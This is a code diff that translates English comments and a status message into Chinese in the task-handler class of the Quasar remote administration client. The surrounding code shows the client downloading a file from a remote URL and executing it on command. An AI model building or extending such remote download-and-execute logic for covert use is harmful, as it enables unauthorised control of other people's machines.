@@ -14,7 +14,7 @@ using System.Threading;
 namespace Quasar.Client.Messages
 {
     /// <summary>
-    /// Handles messages for the interaction with tasks.
+    /// 处理与任务交互的消息。
     /// </summary>
     public class TaskManagerHandler : IMessageProcessor, IDisposable
     {
@@ -84,7 +84,7 @@ namespace Quasar.Client.Messages
         {
             if (string.IsNullOrEmpty(message.FilePath))
             {
-                // download and then execute
+                // 下载然后执行
                 if (string.IsNullOrEmpty(message.DownloadUrl))
                 {
                     client.Send(new DoProcessResponse {Action = ProcessAction.Start, Result = false});
@@ -114,7 +114,7 @@ namespace Quasar.Client.Messages
             }
             else
             {
-                // execute locally
+                // 本地执行
                 ExecuteProcess(message.FilePath, message.IsUpdate);
             }
         }
@@ -145,7 +145,7 @@ namespace Quasar.Client.Messages
                 catch (Exception ex)
                 {
                     NativeMethods.DeleteFile(filePath);
-                    _client.Send(new SetStatus { Message = $"Update failed: {ex.Message}" });
+                    _client.Send(new SetStatus { Message = $"更新失败: {ex.Message}" });
                 }
             }
             else
@@ -182,7 +182,7 @@ namespace Quasar.Client.Messages
         }
 
         /// <summary>
-        /// Disposes all managed and unmanaged resources associated with this message processor.
+        /// 释放与此消息处理器关联的所有托管和非托管资源。
         /// </summary>
         public void Dispose()
         {
